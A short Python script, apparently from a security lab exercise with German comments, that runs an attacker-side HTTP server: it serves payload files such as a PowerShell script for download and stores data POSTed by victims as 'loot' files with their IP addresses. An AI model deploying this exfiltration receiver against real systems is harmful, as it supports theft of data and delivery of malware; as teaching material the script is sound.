#!/usr/bin/env python3
"""
W02a – Lokaler HTTP-Server zum Empfangen exfiltrierter Daten
Autoren: Raphael Bleier, Joachim Lugger

Verwendung:
    python3 server.py [PORT]
    Standard-Port: 8080

Der Server:
  - Hostet alle Dateien im aktuellen Verzeichnis (GET)
  - Empfängt POST-Requests und speichert die Daten in loot/
  - Gibt strukturierte Logs aus
"""

import http.server
import socketserver
import os
import sys
from datetime import datetime

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
LOOT_DIR = os.path.join(os.path.dirname(__file__), "loot")
os.makedirs(LOOT_DIR, exist_ok=True)


class AttackerHandler(http.server.SimpleHTTPRequestHandler):
    """HTTP-Handler: GET liefert Dateien, POST speichert Daten."""

    def do_GET(self):
        # Einfaches Datei-Serving (z.B. für payload.ps1)
        print(f"[GET]  {datetime.now():%H:%M:%S} | {self.client_address[0]} -> {self.path}")
        super().do_GET()

    def do_POST(self):
        length  = int(self.headers.get("Content-Length", 0))
        payload = self.rfile.read(length).decode("utf-8", errors="replace")

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        loot_file = os.path.join(LOOT_DIR, f"loot_{timestamp}_{self.client_address[0]}.txt")

        with open(loot_file, "w") as f:
            f.write(f"=== Received {datetime.now()} from {self.client_address[0]} ===\n")
            f.write(payload)
            f.write("\n")

        print(f"\n[POST] {datetime.now():%H:%M:%S} | {self.client_address[0]}")
        print("-" * 60)
        print(payload[:500])  # Vorschau der ersten 500 Zeichen
        print(f"[INFO] Gespeichert in: {loot_file}\n")

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

    def log_message(self, format, *args):
        pass  # Standard-Logs unterdrücken (verwenden eigene Ausgabe)


if __name__ == "__main__":
    os.chdir(os.path.dirname(__file__) or ".")
    print(f"[*] Angreifer-Server läuft auf Port {PORT}")
    print(f"[*] Serviert Dateien aus: {os.getcwd()}")
    print(f"[*] Loot wird gespeichert in: {LOOT_DIR}")
    print(f"[*] Stoppen mit Ctrl+C\n")
    with socketserver.TCPServer(("", PORT), AttackerHandler) as srv:
        srv.serve_forever()
